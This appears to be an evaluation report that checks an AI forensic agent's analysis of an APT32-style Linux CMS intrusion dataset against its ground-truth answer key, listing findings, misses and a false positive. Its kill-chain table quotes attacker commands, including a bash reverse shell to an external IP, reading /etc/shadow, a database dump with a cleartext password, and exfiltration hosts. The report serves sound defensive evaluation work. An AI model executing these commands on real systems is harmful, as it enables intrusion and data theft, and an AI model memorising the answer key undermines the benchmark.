# FOR577 run vs. ground truth

The FOR577 *log-experiment* dataset (`apt32_linux_cms_db`) ships with a ground-truth answer key
from the data's author. This document correlates **our committed run** (`out/for577/`,
summarized in [[accuracy-report]] §3b) against that key — wins, gaps, and one false positive —
so the accuracy claims are checked against truth, not asserted.

> Ground truth obtained from the dataset owner. The scenario is an **APT32-style intrusion** on a
> Linux Apache/PHP CMS spanning two days: Day 1 (Apr 14) is the web-server compromise; Day 2
> (Apr 15) is privilege escalation, database theft, and exfiltration.

## The actual attack (ground-truth kill chain)

| # | Day | Actor | Step |
|---|-----|-------|------|
| 1 | Apr 14 | www-data | Nikto web scan against WEB-01 `10.42.20.20:80` |
| 2 | Apr 14 | www-data | Failed SQL-injection probes |
| 3 | Apr 14 | www-data | CMS plugin-upload abuse drops a PHP webshell |
| 5 | Apr 14 | www-data | Webshell command execution |
| 6 | Apr 14 | www-data | Interactive reverse shell to **`103.27.202.92:443`** (`bash -i >& /dev/tcp/103.27.202.92/443`) |
| 7 | Apr 14 | www-data | Local discovery (`id`, `uname`, `ip addr`, `find … *.env`) |
| 8 | Apr 14 | www-data | Failed SSH from WEB-01 to DB-01 |
| 9 | Apr 14 | www-data | CMS config review finds DB creds (`cat wp-config.php`, `grep DB_`) |
| 10–11 | Apr 15 | www-data | Privesc recon (`sudo -l`, `find -perm -4000`) → abuse writable `/usr/bin/portal-backup` to drop setuid bash via `/tmp/nb-maint.sh` |
| 12–13 | Apr 15 | **root** | Root shell validation (`bash -p -c 'id; cat /etc/shadow'`), DB connectivity test |
| 14–16 | Apr 15 | root | Enumerate + `mysqldump` finance report tables (`cms_ro:Winter2026!`) to `/var/tmp/.cache` |
| 17–18 | Apr 15 | root | Exfil over HTTPS to **`mosaic-metrics.net`** (`103.27.202.93/94`, `/upload` + `/api/v1/collect`) |
| 19 | Apr 15 | root | Partial cleanup (`rm -f` staged archive + `nb-maint.sh`); **webshell left in place** |
| 20 | Apr 15 | www-data | Low-volume webshell **beaconing** to `103.27.202.92:443` (26 attempts / 20h) |

**Planted red herrings (benign):** `daniel.meyer` SSH maintenance on DB-01; `svc_backup` large
outbound backup-verification transfer on BKP-01; `isaac.green` mistyped SSH on MON-01.

## ✅ Wins — what we got right (all auditor-confirmed, evidence-cited)

| Ground-truth fact | Our finding |
|---|---|
| WEB-01 (`10.42.20.20`) is the compromised host | `web01-*` (HIGH) |
| Root read `/etc/shadow` (`bash -p -c 'id; cat /etc/shadow'`) | `web01-db-credential-access-recon` (HIGH) |
| Hardcoded DB cred `cms_ro:Winter2026!` | cited verbatim (HIGH) |
| Finance DB at `10.42.31.15`, `mysqldump` of report tables to `/var/tmp/.cache` | `web01-root-db-exfil` (HIGH) |
| Exfiltration to `mosaic-metrics.net` | `web01-db-exfil-mosaic-metrics` (HIGH); `103.27.202.93` surfaced as unknown external IP |
| Dropped script `/tmp/nb-maint.sh` | listed as file IOC |
| `rm -f` cleanup of staged dump | `web01-antiforensics-cleanup`; "anti-forensic" *framing* hedged by the auditor (GT confirms it was partial cleanup) |
| No SSH brute force / no log-coverage gaps | `no-bruteforce-logs-intact` — consistent with GT |
| 2 of 3 red herrings correctly ignored | `daniel.meyer` (DB-01) and `isaac.green` (MON-01) never flagged |

**Net:** the **Day-2 data-theft tail** (privesc → DB dump → exfil → cleanup) is reconstructed
correctly, with the right destination, credentials, and dumped tables, every claim traceable to a
`tool_call_id`.

## ❌ Gaps — false negatives (evidence was in scope)

1. **The entire Day-1 web compromise was missed** — nikto scan, SQLi probes, CMS webshell
   upload/exec. We reported initial access as *"could not be established (LOW)."* Recoverable from
   `WEB-01/web_access.log` (115 MB) + Zeek `http`. The agent was **honest** about the gap, but it
   is a real miss.
2. **Reverse shell / primary C2 to `103.27.202.92:443` was missed** (GT step 6), and so was the
   **follow-on beaconing** to the same host (step 20, 26 attempts/20h). `103.27.202.92` and `.94`
   are absent from our IOC table (only `.93` was surfaced).
3. **Privilege-escalation mechanism not reconstructed** — abuse of the writable `portal-backup`
   helper to install setuid bash. We had `/tmp/nb-maint.sh` as an IOC but never built the chain;
   compromise-answer Q6 returned a templated, incorrect string.
4. **Account attribution lost** — Q3 said *"no account attributed (LOW)"* despite `www-data` and
   `root` being all over `root.bash_history`; the `www-data → root` progression was not stated.
5. **Earliest-activity timestamp off by ~20h** — we said `2026-04-15 14:04`; truth is
   `2026-04-14 17:19`. Direct consequence of missing Day 1.

## ⚠️ False positive — the one to fix

**`exfil-23-72-209-230`** — *"Bulk HTTPS exfiltration to `23.72.209.230` from multiple
workstations,"* recorded **HIGH** and **confirmed by the auditor**, is **not in the ground truth.**
`23.72.209.230` is an Akamai range; the only large benign outbound transfer in the scenario is the
**planted `svc_backup` backup-verification red herring**. So this is a confidently-asserted false
positive that the auditor pass did *not* drop — the agent was partially caught by a red herring.

The weaker `smb-octet-stream-staging-10-42-30-35` finding was correctly trimmed (the auditor
dropped its "over SMB" framing because the cited flows were port 22), but the host remains flagged
for human review with no ground-truth support.

## Scorecard

- **Kill-chain coverage:** ~steps 12–19 of 20 reconstructed (the Day-2 theft tail); Day-1
  access + C2 + privesc-mechanism + beaconing missed.
- **Confirmed findings:** 5 — **4 true positives + 1 false positive** (`23.72.209.230`).
- **Red herrings:** 2/3 ignored; 1 (backup verification) likely surfaced as the false positive.
- **Honesty behaviors that held:** initial-access vector left LOW rather than invented;
  persistence flagged as out-of-scope (log-only collection), not denied; "over SMB" embellishment
  dropped.

## Takeaways

1. **The honesty story is validated** — where the agent lacked evidence (initial access,
   persistence), it said so rather than fabricating. Ground truth confirms those were genuine
   coverage limits, not laziness.
2. **The auditor is not a complete false-positive filter** — `23.72.209.230` shows a HIGH-confidence
   external-exfil claim can survive auditing when a benign high-volume flow looks like exfil. The
   auditor checks a claim against its *cited* output; it does not cross-check against a baseline of
   normal traffic. That is the next backstop to build (volumetric/CDN baselining before asserting
   external exfil).
3. **Web-tier evidence needs a first-class agent** — the biggest miss (the whole Day-1 web
   compromise) is a `web_access.log` + Zeek-`http` correlation the current agents under-weight.
